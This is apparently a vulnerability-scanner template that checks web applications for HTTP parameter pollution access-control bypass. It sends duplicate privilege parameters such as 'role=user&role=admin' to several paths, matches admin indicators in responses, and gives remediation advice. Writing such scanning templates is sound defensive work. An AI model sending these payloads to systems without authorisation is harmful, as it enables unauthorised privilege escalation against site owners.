id: parameter-pollution-bypass
info:
  name: HTTP Parameter Pollution Access Control Bypass
  severity: high
  tags: [injection, parameter-pollution, hpp, access-control, bypass, dast]
  description: "Submits duplicate query parameters with contradictory privilege values to test whether the application's access control validates the first occurrence while the backend logic processes the last. A response body containing elevated-access indicators confirms the bypass."
  remediation: "Enforce deterministic parameter parsing: reject or normalise requests with duplicate parameters. Validate all access control decisions server-side independently of parameter ordering."
  cwe: "CWE-235"
  owasp: "A01:2021-Broken Access Control"

requests:
  - method: GET
    paths:
      - "/?admin=false&admin=true"
      - "/?role=user&role=admin"
      - "/?debug=0&debug=1"
      - "/?isAdmin=false&isAdmin=true"
      - "/?privilege=none&privilege=all"
      - "/api/users?admin=false&admin=true"
      - "/api/profile?role=user&role=admin"
      - "/api/admin?access=denied&access=granted"
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "(?i)\"role\":\\s*\"admin\""
          - "(?i)\"isAdmin\":\\s*true"
          - "(?i)\"admin\":\\s*true"
          - "(?i)\"privilege\":\\s*\"all\""
          - "(?i)\"access\":\\s*\"granted\""
        part: body
        condition: or
      - type: dsl
        dsl: "status_code == 200 && contains(to_lower(body), \"admin panel\")"
